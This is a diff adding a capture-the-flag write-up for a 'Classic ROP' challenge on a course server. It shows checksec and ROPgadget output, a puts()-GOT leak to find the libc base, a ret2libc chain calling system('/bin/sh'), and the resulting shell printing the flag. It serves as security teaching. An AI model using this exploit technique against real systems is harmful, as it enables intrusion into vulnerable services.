@@ -157,5 +157,90 @@ $ cat flag.txt
 flag{l1bc_g4dg3ts_f0r_th3_w1n!_22a3e11c237e7557}
 ```
 
+## Challenge - Classic ROP
+```
+Can you still pop a shell?
 
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1202
+```
+Inpecting the file:
+```aiignore
+$ checksec classic_rop
+[*] '/mnt/csgy9223_IntroOffSec/week_7/classic_rop'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Running the binary:
+```aiignore
+$ ./classic_rop
+Let's ROP!
+123456
+123456
+```
+Let's look using binja. So main asks for input, but it calls another function get_number() get the length of the input from fgets(). This means we can control the number of bytes we send in and have the ability to BOF the return pointer. But we need some rops first and quite probably, a pointer to "/bin/sh". We did get a libc binary as well as the main one.
 
+Since we need to call system out of libc, since there are none available in the main binary (nore did we see a "/bin/sh"), we need to leak some data to get a base address.
+
+My plan of attack has changed a bit. I'm first going to have to get an address. Since puts() was called in main, I'll have to use it to send me the address from puts() in the GOT. Then I can return to the main function to pop a shell.
+
+First things first, lets see if we can get the address of puts(). Creating a solver. For this we need an rdi rop:
+```aiignore
+$ ROPgadget --binary ./classic_rop | grep rdi
+0x00000000004011f9 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
+0x00000000004011f6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
+0x00000000004011fc : mov ebp, esp ; pop rdi ; ret
+0x00000000004011fb : mov rbp, rsp ; pop rdi ; ret
+0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
+0x00000000004011fe : pop rdi ; ret
+0x00000000004011fa : push rbp ; mov rbp, rsp ; pop rdi ; ret
+```
+And we have one in the main binary at: 0x00000000004011fe. We'll also need to compute the place to jump back into main. So we'll have to compile some assembler to get an offset.
+
+The bof_buf in main is 0x28 bytes off the rip, so I'll need to add 0x28 bytes of filler:
+- 0x28 filler
+- 0x8 rdi gadget address
+- 0x8 puts() got address
+- 0x8 main + offset into main
+
+The rop chain looks like:
+```aiignore
+chain = [
+    rdi_gadget.address,
+    puts_got_address,
+    puts_plt_address,
+    main_address + main_offset_into
+]
+```
+72 (0x48) bytes + 1 (LF) , the length I'll send to the first input. Which needs to be a string "73"
+
+Once I was able to get the puts() address, I computed the base address which allowed me to reference a "bin/sh" string and the system address. Then I constructed a rop chain to pop the shell:
+```aiignore
+chain = [
+    rdi_gadget.address,
+    bin_sh_address,
+    system_address
+]
+```
+The results are:
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x15 bytes:
+    b'classic_rop\n'
+    b'flag.txt\n'
+classic_rop
+flag.txt
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x3b bytes:
+    b'flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}\n'
+flag{th4t_w4s_r0pp1ng_b3f0r3_gl1bc_2.34!_ae1228fe5a2871f0}
+```
